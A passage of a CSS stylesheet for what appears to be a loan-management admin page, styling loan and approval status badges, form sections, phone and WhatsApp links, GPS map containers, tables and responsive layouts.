  border-bottom: 1px solid #eee;
}

.loan-item label {
  font-weight: 500;
  color: #666;
}

.loan-item span {
  color: #333;
  font-weight: 500;
}

.loan-status {
  padding: 4px 8px;
  border-radius: 4px;
  font-size: 12px;
  font-weight: 500;
}

.loan-status.active {
  background: #d4edda;
  color: #155724;
}

.loan-status.overdue {
  background: #f8d7da;
  color: #721c24;
}

.loan-status.pending {
  background: #fff3cd;
  color: #856404;
}

/* Form Data Styles */
.form-info {
  display: flex;
  flex-direction: column;
  gap: 20px;
}

.form-section {
  border: 1px solid #e0e0e0;
  border-radius: 8px;
  padding: 16px;
  background: #fafafa;
}

.form-section h3 {
  margin: 0 0 12px 0;
  color: #333;
  font-size: 16px;
  font-weight: 600;
  border-bottom: 2px solid #4CAF50;
  padding-bottom: 8px;
}

.form-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 12px;
}

.form-item {
  display: flex;
  flex-direction: column;
  gap: 4px;
}

.form-item.full-width {
  grid-column: 1 / -1;
}

.form-item label {
  font-weight: 500;
  color: #666;
  font-size: 14px;
}

.form-item span {
  color: #333;
  font-weight: 500;
  padding: 4px 0;
}

.approval-status {
  padding: 4px 8px;
  border-radius: 4px;
  font-size: 12px;
  font-weight: 500;
}

.approval-status.approved {
  background: #d4edda;
  color: #155724;
}

.approval-status.rejected {
  background: #f8d7da;
  color: #721c24;
}

.approval-status.pending {
  background: #fff3cd;
  color: #856404;
}

.approval-status.overdue {
  background: #f8d7da;
  color: #721c24;
}

/* Phone Link Styles */
.phone-link {
  color: #4CAF50;
  text-decoration: none;
  display: flex;
  align-items: center;
  gap: 5px;
  font-weight: 500;
  transition: color 0.3s ease;
}

.phone-link:hover {
  color: #45a049;
  text-decoration: underline;
}

.whatsapp-icon {
  font-size: 16px;
}

/* Map Styles */
.map-container {
  width: 100%;
  height: 400px;
  border-radius: 8px;
  border: 1px solid #ddd;
  margin-bottom: 15px;
  background: #f8f9fa;
}

.current-location {
  background: #e8f5e8;
  padding: 10px;
  border-radius: 5px;
  margin-bottom: 15px;
  border-left: 4px solid #4CAF50;
}

.map-btn {
  background: #4CAF50;
  color: white;
  border: none;
  padding: 4px 8px;
  border-radius: 4px;
  cursor: pointer;
  font-size: 12px;
  transition: background 0.3s ease;
}

.map-btn:hover {
  background: #45a049;
}

.gps-map {
  width: 100%;
  border-radius: 8px;
  border: 1px solid #ddd;
  background: #f8f9fa;
  position: relative;
  overflow: hidden;
}

/* Table Styles */
.table-container {
  overflow-x: auto;
  margin-bottom: 20px;
}

table {
  width: 100%;
  border-collapse: collapse;
  min-width: 600px;
}

th, td {
  border: 1px solid #ddd;
  padding: 8px 12px;
  text-align: left;
  font-size: 14px;
}

th {
  background: #f5f5f5;
  font-weight: 600;
  position: sticky;
  top: 0;
}

/* Image loading fix */
.document-photo {
  opacity: 0;
  transition: opacity 0.3s ease;
}

.document-photo[src*="placeholder"] {
  opacity: 1;
}

/* Responsive Design */
@media (max-width: 768px) {
  .user-detail-container {
    padding: 10px;
  }
  
  .info-grid,
  .loan-info {
    grid-template-columns: 1fr;
  }
  
  .tabs {
    overflow-x: auto;
    white-space: nowrap;
    padding-bottom: 5px;
  }
  
  .tab {
    flex-shrink: 0;
  }
  
  .gps-map {
    height: 300px;
  }
  
  table {
    min-width: 400px;
  }
  
  th, td {
    padding: 6px 8px;
    font-size: 12px;
  }
}

@media (max-width: 480px) {
  .header {
    flex-direction: column;
    align-items: flex-start;
    gap: 10px;
  }
  
  .gps-map {
    height: 250px;
  }
  
  table {
    min-width: 300px;
  }
  
  th, td {
    padding: 4px 6px;
    font-size: 11px;
  }
  .sms-form {
    flex-direction: column;
    align-items: stretch;
  }
  
  .form-group {
    min-width: auto;
  }
}
</style> 